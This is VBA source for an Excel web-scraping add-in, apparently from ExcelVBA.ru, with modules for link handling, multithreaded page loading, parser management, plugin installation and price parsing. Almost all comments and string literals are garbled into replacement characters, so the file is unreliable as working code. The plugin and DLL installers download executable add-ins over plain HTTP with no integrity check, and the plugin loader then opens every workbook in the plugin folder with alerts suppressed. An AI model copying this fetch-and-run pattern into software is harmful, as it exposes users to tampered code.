            "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|?"
        If MsgBox(msg, vbInformation + vbOKCancel + vbDefaultButton2, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|") = vbCancel Then
            Exit Sub
        Else
            URL$ = "https://ExcelVBA.ru/programmes/Parser/manuals" & URL$
            ThisWorkbook.FollowHyperlink URL$
        End If
    Else
        URL$ = "https://ExcelVBA.ru/" & Split(URL$, "ExcelVBA.ru/")(0)
        FWF.FollowHyperlink URL$
    End If
End Sub

Sub ToggleIsAddin()
    On Error Resume Next
    ThisWorkbook.IsAddin = Not ThisWorkbook.IsAddin
End Sub

Sub ShowBuiltInActionsEditor()
    On Error Resume Next
    With F_ActionSetEditor
        Set .SourceSheet = sh_actions
        .Initialize
        .Show
    End With
End Sub

Sub AddItemsIntoCellContextMenu()
    On Error Resume Next
    For Each menu In ContextMenuList
        With Application.CommandBars(menu)
            .Reset    ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
            
            ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
            With .Controls.Add(1)
                .OnAction = "OpenCellHyperlink": .FaceId = 1018
                .Caption = "|fffd||fffd||fffd||fffd||fffd||fffd|: |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
            End With
            With .Controls.Add(1)
                .OnAction = "CopyCellHyperlink": .FaceId = 19
                .Caption = "|fffd||fffd||fffd||fffd||fffd||fffd|: |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
            End With
        End With
    Next menu
End Sub

Sub RemoveItemsFromCellContextMenu()
    On Error Resume Next
    For Each menu In ContextMenuList
        Application.CommandBars(menu).Reset
    Next menu
End Sub

Function ContextMenuList() As Variant
    ContextMenuList = Array("Cell", "List Range Popup")
End Function

Sub OpenCellHyperlink()
    On Error Resume Next
    Dim hl$, coll As New Collection, msg$, cell As Range, link, i&
    For Each cell In Intersect(ActiveSheet.UsedRange, Selection).Cells
        If Len(cell) Then
            hl$ = "": hl$ = GetCellHyperlinkAddress(cell, True)
            
            ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|
            If Dir(PARSERS_FOLDER$ & "*|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|*.xlp") <> "" Then
                If hl$ Like "*[?]?*=?*" Then
                    hl$ = hl$ & "&FOUND_PRICE=" & cell.value
                Else
                    hl$ = hl$ & "?FOUND_PRICE=" & cell.value
                End If
            End If
            
            For i = 1 To 2000
                DoEvents
            Next
            If IsURL(hl$, False) Then coll.Add hl$
            If coll.Count > 20 Then Exit For
        End If
    Next cell
    
    If coll.Count > 5 Then
        msg$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| " & coll.Count & " |fffd||fffd||fffd||fffd||fffd||fffd|?"
        If MsgBox(msg$, vbDefaultButton2 + vbOKCancel) = vbCancel Then Exit Sub
    End If
    
    For Each link In coll
        FWF.FollowHyperlink link
    Next
End Sub

Sub CopyCellHyperlink()
    On Error Resume Next: Dim hl$
    hl$ = GetCellHyperlinkAddress(ActiveCell)
    If IsURL(hl$, True) Then
        If WindowsClipboard_SetText(hl$) = 0 Then MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", vbExclamation, "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| Windows"
    End If
End Sub


Attribute VB_Name = "mod_MultiThreading"
'---------------------------------------------------------------------------------------
' Module        : mod_MultiThreading                    Version:
' Author        : Igor Vakhnenko                   Date: 09.10.2016
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Compare Text: Option Private Module

Private Sub testMultiThreading()
    'On Error Resume Next
    Dim SourceValues$, res$
    SourceValues = LoadAddinClipboardValues.item(3)
    StopMacro = False

    res = LoadHTML_MultiThreading(SourceValues, 25)
    'MsgBox UBound(Split(res, ARSEP)) + 1, , Len(res)
    ShowText res
End Sub


Function LoadHTML_MultiThreading(ByRef SourceValues$, Optional ByVal MaxThreads&, Optional ByVal Encoding$, _
                                 Optional ByVal HTML_Filters$, Optional ByRef WP As WebsiteParser) As String
    On Error Resume Next
    Dim sender As New HTTP_Requests, coll As New Collection
    For Each v In Split(SourceValues$, ARSEP)
        If IsURL(v) Then coll.Add v, CStr(v)
    Next
    URLsAmount& = coll.Count

    With sender
        If Len(Encoding$) Then .Encoding = Encoding$
        If MaxThreads& > 0 Then .MaxThreads = MaxThreads&
        If Not WP Is Nothing Then .Timeout = WP.Options.RequestTimeout
        .HTML_Filters = HTML_Filters$

        If TEST_ACTIONS_MODE Then WP.CreateTemporaryProgressIndicator
        Set .pi = WP.PrInd1
        .ExecuteAll coll

        If .WaitForResponse() Then
            ' Debug.Print "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Else

            If StopMacro Then
                If TEST_ACTIONS_MODE Then AddBalloon "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & vbNewLine & "(|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)", bt_Warning
            Else
                If TEST_ACTIONS_MODE Or WP.Options.ShowErrors Then

                    Dim ERR_Count&, err_msg$, err_descr$, err_help1$, err_help2$, err_help$
                    ERR_Count& = .RequestFrozen + .RequestStatusFailed

                    If .RequestFrozen Then
                        err_descr$ = "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & .RequestFrozen
                        err_help1$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd| " & .Timeout & " |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| " & .Timeout + 3 & ")"
                    End If

                    If .RequestStatusFailed Then
                        err_descr$ = err_descr$ & IIf(err_descr$ = "", "", ", ") & "|fffd||fffd||fffd||fffd||fffd||fffd|: " & .RequestStatusFailed
                        If .MaxThreads > 1 Then err_help2$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd| " & .MaxThreads & "  |fffd||fffd| " & Application.RoundUp(.MaxThreads / 2, 0) & ")"
                    End If

                    err_descr$ = "<span style='color:red;'>" & err_descr$ & "</span>"
                    If Len(err_help1$) + Len(err_help2$) Then
                        err_help$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & IIf(err_help1$ <> "", err_help1$, "") & _
                                    IIf(err_help2$ <> "", IIf(err_help1$ <> "", ", |fffd| |fffd||fffd||fffd||fffd||fffd| ", " ") & err_help2$, "")
                    End If
                    err_msg$ = "<strong>|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| <a href='http://excelvba.ru/programmes/Parser/actions/LoadHTML_MultiThreading'>|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|</a></strong>" & _
                               vbNewLine & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & ERR_Count& _
                               & " (|fffd||fffd| " & URLsAmount& & "), |fffd||fffd| |fffd||fffd||fffd|" & vbNewLine & err_descr$ & vbNewLine & err_help$
                    AddBalloon err_msg$, bt_Warning
                End If
            End If

        End If
        Set .pi = Nothing

        LoadHTML_MultiThreading = Join(.result.Items, ARSEP)
    End With

    Set coll = Nothing
    Set sender = Nothing
End Function
Attribute VB_Name = "mod_PARSERS_common"
'---------------------------------------------------------------------------------------
' Module        : mod_PARSERS_common
' Author        : Igor Vakhnenko            Date: 13.11.2013
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/                     Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit
Option Private Module

Function StartParser(ByVal ParserName$) As String
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next
    If Not AllParsers(True).ParserExists(ParserName$) Then
        StartParser = "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & ParserName$ & "|fffd|"
        Exit Function
    End If
    ActivateParser ParserName$
    AllParsers.GetActiveParser.Run
End Function

Sub AddNewParser()
    On Error Resume Next
    Dim WP As WebsiteParser: Set WP = AllParsers.Add
    DoEvents
    If Not WP Is Nothing Then CURRENT_PARSER$ WP.Name: WP.Edit
End Sub

Sub EditNextActionsLevel()
    On Error Resume Next
    With F_ParserSettings_Edit
        If .ActiveParser.SourceData.Actions.GetActiveActions.GetLevel = .ActiveParser.SourceData.Actions.GetActiveActions.GetMaxLevel Then
            .CommandButton_MainActions_CreateSublevel_Click        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        Else
            .ComboBox_MainActions_Level.value = Val(.ComboBox_MainActions_Level.value) + 1        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        End If
        .CommandButton_EditActions_Main_Click
    End With
End Sub

Sub EditNextColumn()
    On Error Resume Next
    With F_ParserSettings_Edit
        .ListBox_OutputColumns.ListIndex = .ListBox_OutputColumns.ListIndex + 1
        .CommandButton_EditActions_OC_Click
    End With
End Sub


'Sub test22()
'    Dim TimeStamp As Double, ProcessTime$: TimeStamp = Timer
'
'    Dim WP As WebsiteParser, i&
'    For i = 1 To 1
'        Set WP = AllParsers.GetActiveParser
'    Next
'    ProcessTime$ = Format(Timer - TimeStamp, "0.00") & " |fffd||fffd||fffd|."
'    Debug.Print ProcessTime$, WP.Name
'End Sub

Sub EditActiveParser()
    On Error Resume Next
    Dim WP As WebsiteParser: Set WP = AllParsers.GetActiveParser
    If Not WP Is Nothing Then WP.Edit
End Sub

Sub DeleteActiveParser()
    On Error Resume Next
    Dim WP As WebsiteParser: Set WP = AllParsers.GetActiveParser
    If Not WP Is Nothing Then WP.Delete: UpdateAddinToolbar
End Sub

Sub RunActiveParser()
    On Error Resume Next
    DESCRIPTION_MODE = False
    TEST_ACTIONS_MODE = False
    Dim WP As WebsiteParser: Set WP = AllParsers.GetActiveParser
    If Not WP Is Nothing Then WP.Run: WP.Class_Terminate
End Sub

' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| Excel
Sub RunBuiltinParser_FromWorksheet(ByRef sh As Worksheet, Optional ByRef dic As Dictionary)
    On Error Resume Next
    DESCRIPTION_MODE = False
    ' MsgBox "run from " & sh.Name
    AllParsers.GetFromSheet(sh).Run dic
End Sub
Sub ShowBuiltinParser_FromWorksheet(ByRef sh As Worksheet)
    On Error Resume Next
    'MsgBox "show from " & sh.Name
    AllParsers.GetFromSheet(sh).Edit
End Sub

Function GetParserVariables() As Dictionary
    On Error Resume Next
    If ParserVariables Is Nothing Then Set ParserVariables = New Dictionary
    Set GetParserVariables = ParserVariables
End Function

Sub EditParser(ByVal ParserFilePath$)
    On Error Resume Next
    Dim msg$
    msg$ = "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & ParserFilePath$
    If Dir(ParserFilePath$, vbNormal) = "" Then MsgBox msg, vbExclamation, "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|": Exit Sub

    Dim WP As WebsiteParser: Set WP = AllParsers.AddFromXML(ParserFilePath$, False)
    DoEvents
    msg = "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & ParserFilePath$
    If WP Is Nothing Then MsgBox msg, vbExclamation, "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|": Exit Sub
    WP.Edit
End Sub

Function AllParsers(Optional ByVal Reload As Boolean = False) As WebsiteParsers
    On Error Resume Next
    Static All_Parsers As WebsiteParsers
    If Not Reload Then
        If Not All_Parsers Is Nothing Then Set AllParsers = All_Parsers: Exit Function
    End If
    Set AllParsers = New WebsiteParsers
    AllParsers.LoadAllFromFolder
    Set All_Parsers = AllParsers
End Function

Sub ProgressIndicator_OnStop()
    On Error Resume Next
    With RunningParser.PrInd1
        .line1 = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|..."
        .line2 = "(|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, - |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)"
        .FP.GetControl(1, pi_Bar).BackColor = vbRed
    End With

    Dim WP As WebsiteParser: Set WP = RunningParser.Parent
    While Not WP Is Nothing
        WP.StopRequested = True
        With WP.PrInd1
            .line1 = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|..."
            .line2 = "(|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, - |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|)"
            .FP.GetControl(1, pi_Bar).BackColor = vbRed
        End With

        Set WP = WP.Parent
    Wend
End Sub

Sub Parser_CreateDescription()
    On Error Resume Next
    DESCRIPTION_MODE = False
    TEST_ACTIONS_MODE = False
    Dim WP As WebsiteParser: Set WP = AllParsers.GetActiveParser
    If WP Is Nothing Then MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", vbCritical: Exit Sub

    Dim FirstLevelDescr$, ColumnsDescr$, res$
    FirstLevelDescr$ = WP.GetFirstLevelDescription
    ColumnsDescr$ = WP.Columns.GetColumnsDescription

    res$ = FirstLevelDescr$ & vbNewLine & ColumnsDescr$

    ShowTextInBrowser res$
    'ShowText txt
    With GetObject("New:{1C3B4210-F441-11CE-B9EA-00AA006B1A69}")
        .SetText res$
        .PutInClipboard
    End With
    Shell "Cmd.exe /c echo " & Chr(7), vbHide

    WP.Class_Terminate
End Sub
Attribute VB_Name = "mod_Plugin"
'---------------------------------------------------------------------------------------
' Module        : mod_Plugin                    Version:
' Author        : Igor Vakhnenko                   Date: 02.11.2017
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

' Function HTTP() As WinHttpRequest
' Function GetIE() As SHDocVw.InternetExplorer
' Function GetParserVariables() As Dictionary
Option Compare Text: Option Private Module

Sub InstallPlugIn(ByVal PluginName$, ByVal PluginCode$)
    On Error Resume Next
    Dim FileName$, pi As New ProgressIndicator, WB As Workbook, PluginExists As Boolean

    PluginURL$ = "http://excelvba.ru/updates/plugin.php?name=" & PluginName$ & "&code=" & PluginCode$ & "&rnd=" & Left(Rnd(Now) * 1E+15, 10)

    FileName$ = PluginName$ & ".xla"
    PluginFullName$ = PLUGIN_FOLDER$(True) & FileName$
    PluginExists = FWF.FileExists(PluginFullName$)

    Set WB = Application.Workbooks(FileName$)
    If Not WB Is Nothing Then WB.Close False

    pi.Show "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    pi.StartNewAction 10, 20, "|fffd||fffd||fffd||fffd||fffd||fffd|: " & FileName$, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|"
    If PluginExists Then FileCopy PluginFullName$, FWF.temp_folder & "Plugin_Backup_" & Format(Now, "DD-MM-YYYY_HH-NN-SS") & "_" & FileName$

    pi.StartNewAction 20, 100, "|fffd||fffd||fffd||fffd||fffd||fffd|: " & FileName$, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    If FWF.DownLoadFileFromURL(PluginURL$, PluginFullName$, False) Then
        AddBalloon "<b>" & IIf(PluginExists, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|") & " |fffd||fffd||fffd||fffd||fffd||fffd|<br />" & FileName$ & "</b>", bt_Information
        Start_All_Plugins
    Else
        AddBalloon "<b>|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|<br />" & FileName$ & "</b><br />|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", bt_Warning
    End If
    pi.StartNewAction 100, 100, "|fffd||fffd||fffd||fffd||fffd||fffd|"
    DoEvents
    pi.Hide
End Sub

Function GetRunningParser() As WebsiteParser
    On Error Resume Next
    Set GetRunningParser = RunningParser
End Function

Function GetMacroDestinationRange() As Range
    On Error Resume Next
    Set GetMacroDestinationRange = MacroDestinationRange
End Function

Sub Start_All_Plugins()
    On Error Resume Next
    Dim FileName$, coll As Collection, file, WB As Workbook
    Set PLUGIN_LIST = New Dictionary
    Set coll = FWF.FilenamesCollection(PLUGIN_FOLDER$, "*.xl*", 1)
    For Each file In coll
        FileName$ = Dir(file)
        Set WB = Nothing: Set WB = Workbooks(FileName$)
        If WB Is Nothing Then    ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
            Application.DisplayAlerts = False
            Set WB = Workbooks.Open(file)
            Application.DisplayAlerts = True
        End If
        If Not WB Is Nothing Then    ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
            PLUGIN_LIST.Add FileName$, file
        End If
    Next file
End Sub

Sub Close_All_Plugins()
    On Error Resume Next
    Dim FileName$, coll As Collection, file, WB As Workbook
    Set PLUGIN_LIST = New Dictionary
    Set coll = FWF.FilenamesCollection(PLUGIN_FOLDER$, "*.xl*", 1)
    For Each file In coll
        FileName$ = Dir(file)
        Set WB = Nothing: Set WB = Workbooks(FileName$)
        If Not WB Is Nothing Then    ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
            WB.Close
        End If
    Next file
End Sub

Function Install_DLL(ByVal FileName$, Optional ByVal Silent As Boolean = False) As Boolean    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| DLL |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next
    DLL_FullName$ = CreateObject("WScript.Shell").SpecialFolders("MyDocuments") & "\" & FileName$
    If FWF.FileExists(DLL_FullName$) Then Install_DLL = True: Exit Function
    DLL_URL$ = "http://excelvba.ru/resources/Parser/" & FileName$

    If Silent Then
        If FWF.DownLoadFileFromURL(DLL_URL$, DLL_FullName$, False) Then Install_DLL = True
    Else
        Dim pi As New ProgressIndicator
        pi.Show "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| DLL |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        pi.StartNewAction 10, 100, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & FileName$, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| DLL |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        If FWF.DownLoadFileFromURL(DLL_URL$, DLL_FullName$, False) Then
            AddBalloon "<b>" & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & FileName$ & "</b>", bt_Information
            Install_DLL = True
        Else
            AddBalloon "<b>|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| DLL<br />" & FileName$ & "</b><br />|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", bt_Warning
        End If
        pi.StartNewAction 100, 100, "|fffd||fffd||fffd||fffd||fffd||fffd|"
        DoEvents
        pi.Hide
    End If
End Function

Function CheckIfActualVersion() As Boolean    ' checks if parser.xla is up to date
    On Error Resume Next: Dim LastUpdateCheckTime As Date, Checked As Boolean
StartCheckLabel:
    LastUpdateCheckTime = CDate(SETT.GetText("LastCheck", 0, "Updates"))
    If Abs(LastUpdateCheckTime - CDbl(Now)) > 1 Then
        If (Not Checked) And Request_("action=updates") Then
            Checked = True: GoTo StartCheckLabel
        End If
    Else
        CheckIfActualVersion = SETT.GetText("LastCheckComment", "", "Updates") Like "Last version is installed*"
    End If
End Function
Attribute VB_Name = "mod_PriceFunctions"
'---------------------------------------------------------------------------------------
' Module        : mod_PriceFunctions                    Version:
' Author        : Igor Vakhnenko                   Date: 28.10.2015
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit: Option Compare Text: Option Private Module

Function GetPrice2(ByVal txt$, Optional Filters$, Optional ExcludeChars$) As Double
    ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|. |fffd||fffd||fffd||fffd||fffd||fffd| 2
    On Error Resume Next
    Dim res$, PriceClasses As Variant, ClassName, AttrName$, AttrValue$, TagName$, msg$, filter, LenTXT&, FilterApplied As Boolean
    ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - URL, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    If IsURL(txt$) Then msg$ = msg$ & CreateHTMLlink(txt$, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|") & "<br />": txt = LoadFromURL_HTML(txt$)
    If Trim(txt$) = "" Then
        msg$ = msg$ & "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|.<br />"
        GoTo ExitSearchPrice
    Else
        msg$ = msg$ & "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| HTML |fffd||fffd||fffd||fffd|: " & Len(txt) & "<br />"
    End If

    If Len(Trim(Filters$)) Then
        LenTXT& = Len(txt)
